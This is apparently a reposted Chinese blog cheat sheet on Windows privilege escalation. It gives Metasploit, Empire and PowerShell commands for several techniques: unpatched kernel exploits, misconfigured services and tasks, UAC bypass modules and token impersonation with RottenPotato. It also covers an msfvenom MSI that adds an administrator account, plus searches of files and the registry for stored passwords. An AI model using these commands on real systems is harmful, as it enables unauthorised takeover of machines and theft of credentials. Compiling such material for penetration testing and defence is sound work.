# Windows提权总结

https://www.cnblogs.com/-mo-/p/12718115.html

## 0x01 简介

提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。

Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等

## 0x02 按提权方法分类

### 2.1 系统内核溢出漏洞提权

此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。

下面是几个方便查找相应补丁漏洞的辅助查询页面：

```bash
https://github.com/ianxtianxt/win-exp-
https://github.com/SecWiki/windows-kernel-exploits
```

```powershell
#手工查找补丁情况
systeminfo
Wmic qfe get Caption,Description,HotFixID,InstalledOn

#MSF后渗透扫描
post/windows/gather/enum_patches

#Powershell扫描
Import-Module C:\Sherlock.ps1
Find-AllVulns
```

### 2.2 系统配置错误提权

```bash
#Empire内置模块
usemodule privesc/powerup/allchecks
execute
```

#### 2.2.1 系统服务权限配置错误

Windows在系统启动时，会伴随着一些高权服务启动，倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持

实现方法可借助：

```bash
1.Powershell中的PowerUp脚本
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

2.Metasploit中的攻击模块   #需要提前获取一个session
exploit/windows/local/service_permissions
```

#### 2.2.2 可信任服务路径漏洞

如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的  
MSF使用实战：

```bash
#寻找存在漏洞的服务
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

#msf攻击模块
exploit/windows/local/trusted_service_path

#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程
set AutoRunScript migrate -f
```

#### 2.2.3 计划任务

如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。

```bash
#查看计算机的计划任务
schtasks /query /fo LIST /v

#查看指定目录的权限配置情况
accesschk.exe -dqv "D:\test" -accepteula
```

### 2.3 组策略首选项提权

组策略首选项(Group Policy Preferences,GPP)，详情见谢公子的博客：[Windows组策略首选项提权](https://blog.csdn.net/qq_36119192/article/details/104344105)

```bash
#Powershell获取cpassword
Get-GPPPassword.ps1

#Msf
post/windows/gather/credentials/gpp

#Empire
usemodule privesc/gpp
```

### 2.4 绕过UAC提权

backlion师傅有一篇博文，主要写的就是这个：[使用Metasploit绕过UAC的多种方法](https://www.cnblogs.com/backlion/p/10552137.html)

```bash
#Msf
exploit/windows/local/ask       #弹出UAC确认窗口，点击后获得system权限
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_comhijack

#Powershell
Invoke-PsUACme

#Empire
usemodule privesc/bypassuac
usemodule privesc/bypassuac_wscript
```

## 2.3 令牌窃取

```dockerfile
#已经获取到一个session
#方法一
meterpreter > use incognito
......
meterpreter > list_tokens -u
WIN-2HU3N1\Administrator
meterpreter > impersonate_token WIN-2HU3N1\\Administrator  #注意：这里是两个反斜杠\\
Successfully......
meterpreter > shell

C:\User\Administrator>whoami
WIN-2HU3N1\Administrator
```

```bash
#方法二,借用Rotten potato程序
https://github.com/foxglovesec/RottenPotato.git
meterpreter > use incognito
meterpreter > list_tokens -u
WIN-2HU3N1\Administrator
meterpreter > upload /root/Rottenpotato/rottenpotato.exe
Successfully
meterpreter > execute -HC -f rottenpotato.exe
Successfully
meterpreter > getuid
...NT AUTHORITY\SYSTEM
```

## 2.4 无凭证条件下的权限提升

Responder.py：https://github.com/SpiderLabs/Responder.git

## 0x03 按系统类型类型

### 3.1 Windows2000/2003、XP

#### 3.1.1 at本地命令提权

在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将 Administrators 组下的用户权限提升到 SYSTEM

at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、可以是一个二进制文件。

```dos
语法：at 时间 命令
例子：at 10:45PM calc.exe
```

该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “/interactive”开启界面交互模式：

![](https://minioapi.nerubian.cn/image/20250410152606948.png)

在得到一个system的cmd之后，使用 taskmgr 命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境

![](https://minioapi.nerubian.cn/image/20250410152609962.png)

#### 3.1.2 at 配合 msf提权

msf下生成木马文件，at命令执行运行程序，上线后即为system

![](https://minioapi.nerubian.cn/image/20250410152612303.png)

### 3.2 windows 7/8、03/08、12/16

#### 3.2.1 sc命令提权

关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。

```dos
sc Create syscmd binPath= "cmd /K start" type= own type= interact
```

这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务，然后执行以下命令，就得到了一个system权限的cmd环境：

```powershell
sc start systcmd
```

#### 3.2.2 AlwaysInstallElevated

AlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。

可以通过查询以下注册表项来识别此设置：

```csharp
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
```

使用reg query命令查询是否存在漏洞

```bash
C:> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
or
C:> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

如果系统没这个漏洞，它将输出错误:

```vbnet
ERROR: The system was unable to find the specified registry key or value.
```

如果存在漏洞，上面将输出以下内容:

![](https://minioapi.nerubian.cn/image/20250410152615683.png)

然后我们使用msfvenom生成msi文件，进行提权

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi

msiexec /quiet /qn /i C:\programdata\rotten.msi
# /quiet    安装过程中禁止向用户发送消息
# /qn       不使用GUI
# /i        安装程序
```

```bash
msf下的自动模块
exploit/windows/local/always_install_elevated
```

#### 3.2.3 Unattended Installs

自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。

全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：

```makefile
C:\Windows\Panther\ 
C:\Windows\Panther\Unattend\ 
C:\Windows\System32\ 
C:\Windows\System32\sysprep\
```

除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。

```bash
C:\Users\user\Desktop> dir C:*vnc.ini /s /b /c
```

```bash
#或者在名称中包含关键词的项目：
C:\Users\user\Desktop> dir C:\ /s /b /c | findstr /sr *password*

#或者可以在文件内容中搜索password之类的关键字：
C:\Users\user\Desktop>findstr /si password *.txt | *.xml | *.ini

#可以查询注册表，例如，字符串password：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。

```bash
#msf模块
post/windows/gather/enum_unattend
```

![](https://minioapi.nerubian.cn/image/20250410152618937.png)

### 3.3 常用系统漏洞CVE

```perl
#Windows10
CVE-2020-0796 https://www.cnblogs.com/-chenxs/p/12618678.html

#Windows7/2008
CVE-2018-8120 https://www.cnblogs.com/-mo-/p/11404598.html

#Windows7/8、2008/2012/2016
CVE-2017-0213 https://www.cnblogs.com/-mo-/p/11446144.html

#SQL Server、IIS通杀 (针对本地用户的，不能用于域用户)
MS16-075(RottenPotato) https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075

#持续更新中......
```

## 参考链接

https://www.cnblogs.com/-mo-/p/12333943.html  
http://hackergu.com/powerup-stealtoken-rottenpotato/  
https://blog.csdn.net/Fly_hps/article/details/80301264  
https://lengjibo.github.io/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/

